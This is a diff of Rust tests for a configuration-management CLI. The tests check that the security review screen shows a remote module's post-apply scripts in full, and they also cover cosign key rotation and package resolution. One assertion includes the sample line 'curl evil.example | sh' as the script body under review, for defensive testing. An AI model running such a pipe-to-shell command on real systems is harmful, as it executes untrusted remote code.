-    assert!(!entry.contains_key("strategy"));
-    assert!(!entry.contains_key("private"));
+    assert_eq!(
+        files[0],
+        serde_json::json!({
+            "source": "vimrc",
+            "target": "~/.vimrc",
+            "strategy": "Symlink",
+            "private": true,
+            "encryption": { "backend": "sops", "mode": "InRepo" },
+            "permissions": "600",
+        })
+    );
 }
 
 #[test]
@@ -4810,13 +5179,30 @@ mod keys_with_fake_cosign {
         );
     }
 
+    /// A rotate with no key to rotate refuses before it provisions anything.
+    ///
+    /// The install is the most expensive thing the verb does and the one thing
+    /// it cannot take back, so a run that was always going to refuse must
+    /// refuse first; before the reorder this verb ran a real `apt install
+    /// cosign` on every CI runner to reach an error it already had.
     #[test]
+    #[serial]
     fn cmd_module_keys_rotate_fails_when_no_existing_private_key() {
-        // No shim needed — the missing-key check fires before cosign is
-        // ever invoked. CFGD_COSIGN_BIN is not set; require_tool_with_seam
-        // falls through to require_tool, which finds the real cosign on
-        // PATH (or surfaces "cosign not found" if missing). Either way,
-        // the precondition error wins.
+        let _path_lock = cfgd_core::test_helpers::path_env_mutation_guard();
+        let _dirs = cfgd_core::test_helpers::BootstrappedPathDirsGuard::capture_and_clear();
+        let _paths = cfgd_core::test_helpers::CommandPathMemoTtlGuard::always_expired();
+        let _avail = cfgd_core::test_helpers::AvailabilityMemoTtlGuard::always_expired();
+        // No manager of this host is reachable, and the one that would be
+        // logs every argv: the claim is that NOTHING was spawned to get a tool
+        // the verb never needed.
+        let _managers = cfgd_core::test_helpers::NoHostManagers::pinned_missing();
+        let shim = cfgd_core::test_helpers::ToolShim::install("CFGD_BREW_BIN", 0, "", "");
+        let _seam = cfgd_core::test_helpers::EnvVarGuard::set(
+            "CFGD_COSIGN_BIN",
+            cfgd_core::test_helpers::ABSENT_SEAM_PATH,
+        );
+        let _empty = cfgd_core::test_helpers::EnvVarGuard::set("PATH", "");
+
         let work = tempfile::tempdir().expect("workdir");
         let dir_str = work.path().to_str().unwrap();
 
@@ -4824,13 +5210,14 @@ mod keys_with_fake_cosign {
         let err = cmd_module_keys_rotate(&printer, Some(dir_str), &[])
             .expect_err("missing cosign.key → Err");
         let msg = err.to_string();
-        // require_tool_with_seam might fail first if cosign is missing
-        // on PATH (no env var, no real binary). Accept either error path
-        // here; the rotate-without-key precondition is the one that matters
-        // most, but both are valid early-failures.
         assert!(
-            msg.contains("No existing cosign.key") || msg.contains("cosign not found"),
-            "expected missing-key or cosign-not-installed error: {msg}"
+            msg.contains("No existing cosign.key"),
+            "the precondition is what refuses, not the missing tool: {msg}"
+        );
+        assert_eq!(
+            shim.argv_log(),
+            "",
+            "and no manager was put to work for a run that was always going to refuse"
         );
     }
 
@@ -5185,6 +5572,14 @@ fn print_module_review_summary_warns_on_post_apply_scripts() {
         "explicit warning text: {out}"
     );
     assert!(
+        out.contains("postApply"),
+        "the hook heads its steps, spelled as the YAML spells it: {out}"
+    );
+    assert!(
+        out.contains("1/1"),
+        "the step states its position among its hook's steps: {out}"
+    );
+    assert!(
         out.contains("curl evil.example | sh"),
         "script body verbatim: {out}"
     );
@@ -5209,7 +5604,8 @@ fn print_module_review_summary_omits_empty_sections() {
     let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(!out.contains("Packages"), "no packages section: {out}");
     assert!(!out.contains("Files"), "no files section: {out}");
-    assert!(!out.contains("Post-apply"), "no scripts section: {out}");
+    assert!(!out.contains("Post-apply"), "no scripts warning: {out}");
+    assert!(!out.contains("postApply"), "no hook section: {out}");
 }
 
 #[test]
@@ -5484,12 +5880,12 @@ fn print_module_review_summary_omits_env_and_alias_sections_when_absent() {
 
 #[test]
 fn has_second_non_empty_line_shared_predicate_matches_both_review_surfaces() {
-    // `print_module_review_summary`'s post-apply-script rendering and the
-    // upgrade-diff "Changes" section both gate bullet-vs-code_block on this
-    // one function now — pin the exact cases that used to disagree under
-    // the old `contains('\n')` gate (a `run: |` block scalar's trailing
-    // newline survives into a single logical line) and the true
-    // multi-line case that must still render as a code block.
+    // Every review entry that is not a script body gates bullet-vs-code_block
+    // on this one function: an alias command, an env value, an upgrade diff row.
+    // The cases pinned here are the ones that used to disagree under the old
+    // `contains('\n')` gate (a YAML block scalar's trailing newline survives
+    // into a single logical value) plus the true multi-line case that must
+    // still render as a code block.
     assert!(
         !super::registry::has_second_non_empty_line("echo hello"),
         "single line, no trailing newline"
@@ -5509,26 +5905,32 @@ fn has_second_non_empty_line_shared_predicate_matches_both_review_surfaces() {
     assert!(!super::registry::has_second_non_empty_line(""));
 }
 
+/// The upgrade diff names the change and hands the body to the composer, so a
+/// changed script reaches neither the bullet nor the code-block gate: the row
+/// carries the role alone, and the step below it is the shape the add screen
+/// shows.
 #[test]
-fn upgrade_diff_trailing_newline_script_change_renders_as_single_bullet_not_code_block() {
-    // Mirrors `print_module_review_summary_trailing_newline_script_renders_as_single_bullet`
-    // but for the sibling upgrade-diff surface (`cmd_module_upgrade`'s
-    // "Changes" section) — this surface previously gated on raw
-    // `change.contains('\n')`, which disagreed with
-    // `print_module_review_summary`, so a `run: |` single-logical-line
-    // `postApply script` diff (whose `run_str()` carries a trailing `\n`)
-    // rendered as a code block here while the pre-approval review rendered
-    // the identical body as a bullet.
+fn an_upgraded_modules_script_change_is_a_role_row_with_the_body_under_it() {
     let old = make_loaded_module("m", config::ModuleSpec::default());
     let new = module_with_post_apply_script("echo hello\n");
     let changes = modules::diff_module_specs(&old, &new, "->");
-    let (_, change) = changes
+    let change = changes
         .iter()
-        .find(|(_, c)| c.contains("postApply script"))
+        .find(|c| c.script.is_some())
         .expect("expected a postApply script diff entry");
+    assert_eq!(change.subject, "postApply script added");
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    super::registry::print_spec_changes(&printer, &changes);
+    drop(printer);
+    let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
-        !super::registry::has_second_non_empty_line(change),
-        "a single logical line with a trailing newline must not be routed to a code block: {change:?}"
+        out.contains("postApply script added\n    1/1\n    echo hello"),
+        "the row names the change and the step renders under it: {out:?}"
+    );
+    assert!(
+        !out.contains("script added: echo hello"),
+        "the body is the composer's, not part of the row: {out:?}"
     );
 }
 
@@ -5546,8 +5948,11 @@ fn module_with_post_apply_script(run: &str) -> modules::LoadedModule {
     )
 }
 
+/// The composer renders every step the same way, so a one-line body is its
+/// marker and its highlighted body too: no bullet glyph, and no `$ ` prompt
+/// the body did not declare.
 #[test]
-fn print_module_review_summary_single_line_script_renders_as_bullet() {
+fn print_module_review_summary_single_line_script_renders_its_body_through_the_composer() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("echo hello");
@@ -5555,13 +5960,17 @@ fn print_module_review_summary_single_line_script_renders_as_bullet() {
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
-        out.contains("- $ echo hello"),
-        "expected bullet line: {out}"
+        out.contains("    1/1\n    echo hello"),
+        "expected the marker above the body: {out:?}"
+    );
+    assert!(
+        !out.contains("$ echo hello") && !out.contains("- echo hello"),
+        "a step is neither prompted nor bulleted: {out:?}"
     );
 }
 
 #[test]
-fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet() {
+fn print_module_review_summary_trailing_newline_script_renders_one_body_line() {
     // The `run: |` YAML block-scalar shape: `run_str()` returns the line plus
     // a trailing `\n`. This is the exact case that used to reach `bullet()`
     // with an embedded newline and trip the `write_line` debug_assert.
@@ -5571,48 +5980,232 @@ fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet(
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(
-        out.contains("- $ echo hello"),
-        "expected trimmed bullet line: {out}"
-    );
     assert_eq!(
-        out.matches("$ echo hello").count(),
+        out.matches("echo hello").count(),
         1,
         "trailing newline must not produce a second rendered line: {out}"
     );
 }
 
 #[test]
-fn print_module_review_summary_leading_blank_line_script_renders_as_single_bullet() {
+fn print_module_review_summary_leading_blank_line_script_renders_its_body() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("\necho hello");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
+    // The blank line the body opens with is part of the body, so it renders as
+    // a blank row between the marker and the command rather than being eaten.
     assert!(
-        out.contains("- $ echo hello"),
-        "expected trimmed bullet line: {out}"
+        out.contains("    1/1\n\n    echo hello"),
+        "the marker, the declared blank line, then the command: {out:?}"
     );
 }
 
 #[test]
 fn print_module_review_summary_multi_line_script_renders_every_line_verbatim() {
-    // Genuine multi-line scripts must stay verbatim via `code_block` (not
-    // condensed to a single line) — this is the pre-install security review
-    // of a remote module's script, so nothing after the first line may be
-    // hidden from the user.
+    // The pre-install security review of a remote module's script, so every
+    // line shows: a body condensed to its first line hides the rest of what
+    // the operator is approving.
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = module_with_post_apply_script("echo one\necho two");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(out.contains("$ echo one"), "first line verbatim: {out}");
-    assert!(out.contains("$ echo two"), "second line verbatim: {out}");
     assert!(
-        !out.contains("- $ echo one") && !out.contains("- $ echo two"),
-        "multi-line script must render via code_block (no bullet dash), not condensed: {out}"
+        out.contains("    echo one\n    echo two"),
+        "both lines, in order and unprompted: {out:?}"
+    );
+    assert!(
+        !out.contains("- echo one") && !out.contains('\u{2026}'),
+        "a reviewed body is neither bulleted nor condensed: {out:?}"
+    );
+}
+
+/// The approval screen a remote module's post-apply steps reach, rendered by
+/// the one Scripts composer: the warning row states how many bodies follow,
+/// then the hook heads its steps as `cfgd module show --show-scripts` heads
+/// them, each step stating its knobs above its highlighted body. A `\r` inside
+/// a body shows as `\x0d` rather than returning the cursor over the line the
+/// operator is reading.
+#[test]
+fn a_remote_modules_post_apply_steps_reach_the_approval_screen_through_the_composer() {
+    let (printer, buf) = cfgd_core::output::Printer::for_test_with_theme_colored(
+        cfgd_core::output::Theme::preset("dracula").expect("dracula is a registered preset"),
+        cfgd_core::output::Verbosity::Normal,
+    );
+    let module = make_loaded_module(
+        "nvim",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                post_apply: vec![
+                    cfgd_core::config::ScriptEntry::Full(cfgd_core::config::ScriptCommand {
+                        run: "set -eu\nif ! command -v jq >/dev/null; then\n  echo \"jq missing\" >&2\n  exit 1\nfi".into(),
+                        timeout: Some("120s".into()),
+                        continue_on_error: Some(true),
+                        ..Default::default()
+                    }),
+                    cfgd_core::config::ScriptEntry::Simple("jq --version\r\n".into()),
+                ],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(
+        &printer,
+        "nvim",
+        &module,
+        "c0ffee",
+        "sha256:dec0",
+    );
+    drop(printer);
+    // raw-capture-ok: the escapes are half of what this test claims — a stripping read removes exactly what it compares
+    let raw = buf.lock().unwrap_or_else(|e| e.into_inner()).clone();
+
+    let lines: Vec<&str> = raw.lines().collect();
+    let warning = lines
+        .iter()
+        .position(|l| l.contains("Post-apply scripts (2)"))
+        .unwrap_or_else(|| panic!("the warning row states how many bodies follow: {raw:?}"));
+    assert!(
+        lines[warning].contains("these will execute on your machine:"),
+        "the warning row keeps its wording: {:?}",
+        lines[warning]
+    );
+    // The hook heading sits at the warning row's own depth, and its name is the
+    // one the YAML spells.
+    assert!(
+        cfgd_core::output::strip_ansi(lines[warning + 1]) == "  postApply",
+        "the hook heads its steps: {:?}",
+        lines[warning + 1]
+    );
+    assert!(
+        lines[warning + 1].contains('\u{1b}'),
+        "the heading carries the preset's coat: {:?}",
+        lines[warning + 1]
+    );
+    assert_eq!(
+        cfgd_core::output::strip_ansi(lines[warning + 2]),
+        "    1/2 \u{b7} timeout 120s \u{b7} continueOnError",
+        "the step states its position and the knobs it declares: {:?}",
+        lines[warning + 2]
+    );
+    let body = &lines[warning + 3..warning + 8];
+    assert_eq!(
+        body.iter()
+            .map(|l| cfgd_core::output::strip_ansi(l))
+            .collect::<Vec<_>>(),
+        vec![
+            "    set -eu",
+            "    if ! command -v jq >/dev/null; then",
+            "      echo \"jq missing\" >&2",
+            "      exit 1",
+            "    fi",
+        ],
+        "every line of the body, in order: {raw:?}"
+    );
+    for line in body {
+        assert!(
+            line.ends_with("\u{1b}[0m"),
+            "a highlighted line closes on a reset: {line:?}"
+        );
+        assert!(
+            !cfgd_core::output::strip_ansi(line)
+                .trim_start()
+                .starts_with("$ "),
+            "a body carries no prompt it did not declare: {line:?}"
+        );
+    }
+    let stripped = cfgd_core::output::strip_ansi(&raw);
+    assert!(
+        stripped.contains("    jq --version\\x0d"),
+        "a carriage return shows as text rather than returning the cursor: {stripped:?}"
+    );
+    cfgd_core::output::test_capture::assert_snapshot_at(
+        &cfgd_core::test_helpers::workspace_root().join("crates/cfgd/tests/output_snapshots"),
+        "module_add/post_apply_review.txt",
+        &stripped,
+    );
+}
+
+/// The Changes section of a module upgrade: each script change is a role row
+/// naming it, with the step itself rendered under the row by the same composer
+/// the add screen reaches, removals before additions. A blank line inside a
+/// body renders blank rather than as an indented reset.
+#[test]
+fn an_upgrade_diffs_script_changes_render_their_bodies_through_the_composer() {
+    let old = make_loaded_module(
+        "nvim",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                post_apply: vec![cfgd_core::config::ScriptEntry::Simple(
+                    "nvim --headless +PlugClean +qa".into(),
+                )],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    );
+    let new = make_loaded_module(
+        "nvim",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                post_apply: vec![cfgd_core::config::ScriptEntry::Full(
+                    cfgd_core::config::ScriptCommand {
+                        run: "set -eu\n\nnvim --headless +PlugInstall +qa\nnvim --headless +UpdateRemotePlugins +qa".into(),
+                        timeout: Some("300s".into()),
+                        ..Default::default()
+                    },
+                )],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    );
+    let changes = modules::diff_module_specs(&old, &new, "->");
+    let (printer, buf) = cfgd_core::output::Printer::for_test_with_theme_colored(
+        cfgd_core::output::Theme::preset("dracula").expect("dracula is a registered preset"),
+        cfgd_core::output::Verbosity::Normal,
+    );
+    super::registry::print_spec_changes(&printer, &changes);
+    drop(printer);
+    // raw-capture-ok: the escapes are half of what this test claims — a stripping read removes exactly what it compares
+    let raw = buf.lock().unwrap_or_else(|e| e.into_inner()).clone();
+
+    let lines: Vec<&str> = raw.lines().collect();
+    let removed = lines
+        .iter()
+        .position(|l| l.contains("postApply script removed"))
+        .unwrap_or_else(|| panic!("a removed step is named: {raw:?}"));
+    let added = lines
+        .iter()
+        .position(|l| l.contains("postApply script added"))
+        .unwrap_or_else(|| panic!("an added step is named: {raw:?}"));
+    assert!(
+        removed < added,
+        "a changed step reads as the old one going and the new one arriving: {raw:?}"
+    );
+    assert_eq!(
+        cfgd_core::output::strip_ansi(lines[added + 1]),
+        "    1/1 \u{b7} timeout 300s",
+        "the step states its position and knobs under the row: {:?}",
+        lines[added + 1]
+    );
+    for line in &lines[added + 2..] {
+        let stripped = cfgd_core::output::strip_ansi(line);
+        assert!(
+            stripped.trim().is_empty() == stripped.is_empty(),
+            "a blank line in a body renders blank, not as indent plus a reset: {line:?}"
+        );
+    }
+    let stripped = cfgd_core::output::strip_ansi(&raw);
+    cfgd_core::output::test_capture::assert_snapshot_at(
+        &cfgd_core::test_helpers::workspace_root().join("crates/cfgd/tests/output_snapshots"),
+        "module_upgrade/script_changes.txt",
+        &stripped,
     );
 }
 
@@ -7248,7 +7841,7 @@ fn cmd_module_delete_purge_doc_payload_counts_processed_files() {
     std::fs::write(&target_file, "deployed").unwrap();
     let yaml = format!(
         "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: purge-doc\nspec:\n  files:\n    - source: files/deployed.conf\n      target: {}\n",
-        target_file.display()
+        cfgd_core::to_posix_string(&target_file)
     );
     make_module(dir.path(), "purge-doc", &yaml);
     std::fs::write(
@@ -7543,6 +8136,10 @@ fn every_surface_naming_the_shell_pair_lists_aliases_first() {
     };
     let declared = cfgd_core::modules::ModuleSurfaces::of(&spec);
     let module_status = crate::cli::status::ModuleStatus {
+        packages_hash: None,
+        files_hash: None,
+        commit: None,
+        integrity: None,
         name: "nvim".into(),
         packages: 0,
         files: 0,
@@ -7573,11 +8170,15 @@ fn every_surface_naming_the_shell_pair_lists_aliases_first() {
         ),
         (
             "cfgd status <module> -o wide",
-            crate::cli::status::ModuleStatusView::Inventory { show_values: false },
+            crate::cli::status::ModuleStatusView::Inventory {
+                masking: crate::cli::EnvValueMasking::default(),
+            },
         ),
         (
             "cfgd status <module> --show-values",
-            crate::cli::status::ModuleStatusView::Inventory { show_values: true },
+            crate::cli::status::ModuleStatusView::Inventory {
+                masking: crate::cli::EnvValueMasking::revealing(),
+            },
         ),
     ] {
         let (printer, buf) =
@@ -7597,19 +8198,16 @@ fn every_surface_naming_the_shell_pair_lists_aliases_first() {
         directory: "/cfg/modules/nvim".into(),
         source: "local".into(),
         depends: Vec::new(),
-        state: None,
         spec: spec.clone(),
+        resolved: None,
     };
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     printer.emit(super::list_show::build_module_show_doc(
         &show,
         None,
-        &[],
-        false,
-        true,
+        crate::cli::InventoryDetail::default(),
         "->",
-        now,
     ));
     drop(printer);
     surfaces.push((
@@ -7648,6 +8246,8 @@ fn every_surface_naming_the_shell_pair_lists_aliases_first() {
         std::path::Path::new("/cfg/config.yaml"),
         &[],
         printer.arrow(),
+        crate::cli::InventoryDetail::default(),
+        true,
     ));
     drop(printer);
     surfaces.push((
@@ -7702,4 +8302,90 @@ fn every_surface_naming_the_shell_pair_lists_aliases_first() {
         row_of("gs") < row_of("EDITOR"),
         "cfgd diff's Shell section lists env vars ahead of aliases: {ordered:#?}"
     );
+}
+
+/// `module show --resolved` states which manager each declared package lands
+/// on, and the three answers a resolution can give reach three different rows.
+///
+/// The rows were captured from hand-built `PackageDisplay` values, so the
+/// resolution itself — the only host-reading part of the verb — was proven by
+/// nothing: a manager map that stopped being consulted, or a platform gate
+/// that stopped filtering, would have rendered the same golden.
+#[test]
+fn module_show_resolved_rows_states_each_of_the_three_resolutions() {
+    use cfgd_core::providers::PackageManager;
+    use cfgd_core::test_helpers::MockPackageManager;
+
+    let apt = MockPackageManager::new("apt")
+        .with_installed_at("ripgrep", "14.0.0")
+        .offering("ripgrep", "14.1.0");
+    let mgr_map: std::collections::HashMap<String, &dyn PackageManager> =
+        [("apt".to_string(), &apt as &dyn PackageManager)]
+            .into_iter()
+            .collect();
+    let platform = cfgd_core::platform::Platform {
+        os: cfgd_core::platform::Os::Linux,
+        distro: cfgd_core::platform::Distro::Debian,
+        version: "12".to_string(),
+        arch: cfgd_core::platform::Arch::X86_64,
+    };
+
+    let mut gated = make_pkg("mas-cli");
+    gated.platforms = vec!["darwin".to_string()];
+    let mut unsatisfiable = make_pkg("ghostty");
+    unsatisfiable.prefer = vec!["brew".to_string()];
+
+    let spec = cfgd_core::config::ModuleSpec {
+        packages: vec![make_pkg("ripgrep"), gated, unsatisfiable],
+        ..Default::default()
+    };
+
+    let (printer, _cap) = cfgd_core::output::Printer::for_test_doc();
+    let state = cfgd_core::state::StateStore::open_in_memory().unwrap();
+    let cx = cfgd_core::providers::PackageContext::new(&printer, &state);
+    let rows = super::list_show::module_show_resolved_rows(
+        &spec,
+        "dev-tools",
+        &platform,
+        &mgr_map,
+        Some(&cx),
+    );
+
+    assert_eq!(rows.len(), 3, "one row per declared package: {rows:#?}");
+    match &rows[0] {
+        super::list_show::PackageDisplay::Resolved {
+            name,
+            manager,
+            resolved_name,
+            version,
+        } => {
+            assert_eq!(name, "ripgrep");
+            assert_eq!(manager, "apt", "the one available manager holding it wins");
+            assert_eq!(resolved_name, "ripgrep");
+            assert_eq!(
+                version.as_deref(),
+                Some("14.1.0"),
+                "the row states what the manager OFFERS, which is what \
+                 `fill_available_versions` fills and not the installed copy"
+            );
+        }
+        other => panic!("a package an available manager holds resolves: {other:#?}"),
+    }
+    match &rows[1] {
+        super::list_show::PackageDisplay::Skipped { name, platforms } => {
+            assert_eq!(name, "mas-cli");
+            assert_eq!(
+                platforms, ", platforms: darwin",
+                "the row says which host the entry was declared for"
+            );
+        }
+        other => panic!("a platform-gated entry resolves to nothing on this host: {other:#?}"),
+    }
+    match &rows[2] {
+        super::list_show::PackageDisplay::Unresolved { summary, error } => {
+            assert!(summary.starts_with("ghostty"), "summary: {summary}");
+            assert!(!error.is_empty(), "the row states why it could not resolve");
+        }
+        other => panic!("an entry no available manager can satisfy is unresolved: {other:#?}"),
+    }
 }
